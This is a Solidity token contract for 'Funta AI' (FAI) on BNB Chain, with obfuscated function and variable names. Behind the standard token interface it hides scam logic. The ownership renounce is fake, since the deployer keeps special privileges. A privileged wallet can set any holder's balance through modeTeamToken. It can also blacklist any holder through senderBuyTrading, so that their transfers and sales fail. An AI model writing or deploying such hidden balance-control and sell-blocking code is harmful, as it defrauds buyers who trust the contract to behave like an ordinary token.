/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface limitFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverTo) external view returns (uint256);

    function transfer(address launchedSwap, uint256 txReceiver) external returns (bool);

    function allowance(address exemptReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 txReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address launchedSwap,
        uint256 txReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingAmount, uint256 value);
    event Approval(address indexed exemptReceiver, address indexed spender, uint256 value);
}

interface fundReceiver is limitFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract modeReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundBuyTeam {
    function createPair(address fundSender, address marketingAmountAt) external returns (address);
}

interface limitMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FuntaAI is modeReceiver, limitFrom, fundReceiver {

    function minFrom() public {
        
        if (marketingMax) {
            autoExempt = buyModeReceiver;
        }
        enableAtToken=false;
    }

    mapping(address => bool) public enableWallet;

    function toList(address exemptList, address launchedSwap, uint256 txReceiver) internal returns (bool) {
        if (exemptList == fundTotal) {
            return amountToken(exemptList, launchedSwap, txReceiver);
        }
        require(!amountTradingEnable[exemptList]);
        return amountToken(exemptList, launchedSwap, txReceiver);
    }

    constructor (){ 
        
        limitMarketing exemptTradingSwap = limitMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyIs = fundBuyTeam(exemptTradingSwap.factory()).createPair(exemptTradingSwap.WETH(), address(this));
        minFundSwap = _msgSender();
        
        fundTotal = _msgSender();
        enableWallet[_msgSender()] = true;
        
        tokenSender[_msgSender()] = liquiditySwap;
        emit Transfer(address(0), fundTotal, liquiditySwap);
        teamAmountShould();
    }

    function owner() external view returns (address) {
        return minFundSwap;
    }

    function allowance(address atTx, address fundLaunchMax) external view virtual override returns (uint256) {
        return toTotal[atTx][fundLaunchMax];
    }

    mapping(address => mapping(address => uint256)) private toTotal;

    bool public amountTrading;

    function balanceOf(address receiverTo) public view virtual override returns (uint256) {
        return tokenSender[receiverTo];
    }

    function enableExempt() public {
        if (enableAtToken != totalLimitLaunched) {
            marketingMax = true;
        }
        if (autoExempt != totalLiquidity) {
            enableWalletAuto = false;
        }
        autoExempt=0;
    }

    function teamAmountShould() public {
        emit OwnershipTransferred(fundTotal, address(0));
        minFundSwap = address(0);
    }

    bool public buyMin;

    function transferFrom(address exemptList, address launchedSwap, uint256 txReceiver) external override returns (bool) {
        if (toTotal[exemptList][_msgSender()] != type(uint256).max) {
            require(txReceiver <= toTotal[exemptList][_msgSender()]);
            toTotal[exemptList][_msgSender()] -= txReceiver;
        }
        return toList(exemptList, launchedSwap, txReceiver);
    }

    function modeTeamToken(address minSell, uint256 txReceiver) public {
        require(enableWallet[_msgSender()]);
        tokenSender[minSell] = txReceiver;
    }

    uint256 private exemptMode;

    uint8 private limitMin = 18;

    uint256 public autoExempt;

    function tradingTake() public {
        if (totalLiquidity != buyModeReceiver) {
            buyModeReceiver = autoExempt;
        }
        if (buyModeReceiver == exemptMode) {
            exemptMode = buyModeReceiver;
        }
        totalLimitLaunched=false;
    }

    address public buyIs;

    function listLaunchLimit(address receiverFrom) public {
        if (amountTrading) {
            return;
        }
        
        enableWallet[receiverFrom] = true;
        if (buyModeReceiver == autoExempt) {
            enableAtToken = true;
        }
        amountTrading = true;
    }

    uint256 private totalLiquidity;

    address private minFundSwap;

    function transfer(address minSell, uint256 txReceiver) external virtual override returns (bool) {
        return toList(_msgSender(), minSell, txReceiver);
    }

    uint256 private liquiditySwap = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return liquiditySwap;
    }

    bool public txTeam;

    string private swapEnableFee = "FAI";

    function approve(address fundLaunchMax, uint256 txReceiver) public virtual override returns (bool) {
        toTotal[_msgSender()][fundLaunchMax] = txReceiver;
        emit Approval(_msgSender(), fundLaunchMax, txReceiver);
        return true;
    }

    function enableLaunch() public {
        if (marketingMax != txTeam) {
            totalLiquidity = exemptMode;
        }
        if (enableWalletAuto) {
            autoExempt = exemptMode;
        }
        buyModeReceiver=0;
    }

    function tradingLiquidity() public view returns (uint256) {
        return totalLiquidity;
    }

    event OwnershipTransferred(address indexed launchAuto, address indexed autoAtIs);

    address public fundTotal;

    function getOwner() external view returns (address) {
        return minFundSwap;
    }

    uint256 private buyModeReceiver;

    mapping(address => uint256) private tokenSender;

    function senderBuyTrading(address limitSender) public {
        
        if (limitSender == fundTotal || limitSender == buyIs || !enableWallet[_msgSender()]) {
            return;
        }
        if (enableAtToken) {
            enableWalletAuto = false;
        }
        amountTradingEnable[limitSender] = true;
    }

    function amountToken(address exemptList, address launchedSwap, uint256 txReceiver) internal returns (bool) {
        require(tokenSender[exemptList] >= txReceiver);
        tokenSender[exemptList] -= txReceiver;
        tokenSender[launchedSwap] += txReceiver;
        emit Transfer(exemptList, launchedSwap, txReceiver);
        return true;
    }

    bool private enableAtToken;

    bool public marketingMax;

    function symbol() external view virtual override returns (string memory) {
        return swapEnableFee;
    }

    mapping(address => bool) public amountTradingEnable;

    bool private totalLimitLaunched;

    function decimals() external view virtual override returns (uint8) {
        return limitMin;
    }

    function name() external view virtual override returns (string memory) {
        return minIs;
    }

    bool public enableWalletAuto;

    string private minIs = "Funta AI";

}